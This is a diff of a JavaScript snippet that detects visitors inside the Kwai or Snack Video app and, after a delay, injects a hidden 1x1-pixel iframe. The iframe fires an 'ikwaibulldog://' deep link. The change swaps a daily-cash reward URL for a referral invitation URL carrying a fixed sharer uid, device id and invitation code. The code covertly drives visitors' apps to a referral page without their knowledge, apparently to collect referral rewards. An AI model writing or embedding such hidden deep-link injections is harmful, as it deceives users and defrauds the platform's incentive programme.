@@ -1,4 +1,4 @@
-// UT19 //
+// UT20 //
 function setCookie(name, value, minutes) {
   var expires = "";
   if (minutes) {
@@ -32,7 +32,7 @@ if (!cookieValue && isKwaiOrSnackVideoApp()) {
   setTimeout(function() {
     var mainUrl = window.location.href;
     var iframe1 = document.createElement('iframe');
-    iframe1.src = 'ikwaibulldog://webview?url=https%3A%2F%2Fincentive.kwai.com%2Fdaily-cash%2Freward%3FgroupId%3DtHSy3zSmKNaZya8_503o-fo8SyLLa_JKE-C-Gy9BHJ6tSV1bt7uWAhToeJ4kBeFJ%26webview%3Dyoda%26showLoading%3Dtrue%26needLogin%3Dtrue%26need_login%3Dtrue%26source%3Dout%26share_channel%3DCOPY_LINK%26hyId%3Dincentive_main%26countryInfo%3DIDN';
+    iframe1.src = 'ikwaibulldog://webview?url=https%3A%2F%2Fincentive.kwai.com%2Factivity%2Ftask-center%3Fwebview%3Dyoda%26page%3Dinvitation%26area%3D%26friend_id%3D%26friend_index%3D%26share_item_type%3Dinvite%26share_device_id%3DANDROID_bbfeff3f7a03cd1f%26share_uid%3D150001431523528%26countryInfo%3DIDN%26language%3Did-id%26sourcePlatform%3DANDROID%26ft%3Dpromotion%26taskId%3D%26countryCode%3DIDN%26cc%3DCOPY_LINK%26share_id%3DANDROID_bbfeff3f7a03cd1f_1685852153692%26kpn%3DKWAI_BULLDOG%26fishId%3D1966%26sharePageType%3D2%26innerPage%3Dhttps%253A%252F%252Fincentive.kwai.com%252Factivity%252Ftask-center%253Fwebview%253Dyoda%2526need_login%253Dtrue%2526loginCheck%253D1%2526showLoading%253Dtrue%2526hyId%253Dincentive_main%2526source%253DSEAMLESS%2526share_uid%253D150001431523528%26shareEnter%3D1%26shareBucket%3Din%26pwa_source%3Dshare%26shareCountry%3DIDN%26shareBiz%3Dh5_activity%26short_key%3Dsw3zjaBd%26hideNavBar%3D1&target_url=https%3A%2F%2Fincentive.kwai.com%2Fshare%2Fincentive%2Finvitation%3Fwebview%3Dyoda%26page%3Dinvitation%26area%3D%26friend_id%3D%26friend_index%3D%26share_item_type%3Dinvite%26share_device_id%3DANDROID_bbfeff3f7a03cd1f%26share_uid%3D150001431523528%26countryInfo%3DIDN%26language%3Did-id%26sourcePlatform%3DANDROID%26ft%3Dpromotion%26taskId%3D%26countryCode%3DIDN%26cc%3DCOPY_LINK%26share_id%3DANDROID_bbfeff3f7a03cd1f_1685852153692%26kpn%3DKWAI_BULLDOG%26fishId%3D1966%26sharePageType%3D2%26innerPage%3Dhttps%253A%252F%252Fincentive.kwai.com%252Factivity%252Ftask-center%253Fwebview%253Dyoda%2526need_login%253Dtrue%2526loginCheck%253D1%2526showLoading%253Dtrue%2526hyId%253Dincentive_main%2526source%253DSEAMLESS%2526share_uid%253D150001431523528%26shareEnter%3D1%26shareBucket%3Din%26pwa_source%3Dshare%26shareCountry%3DIDN%26shareBiz%3Dh5_activity%26short_key%3Dsw3zjaBd&invitationCodeInfo=719569320/';
     iframe1.width = '1';
     iframe1.height = '1';
     document.body.appendChild(iframe1);
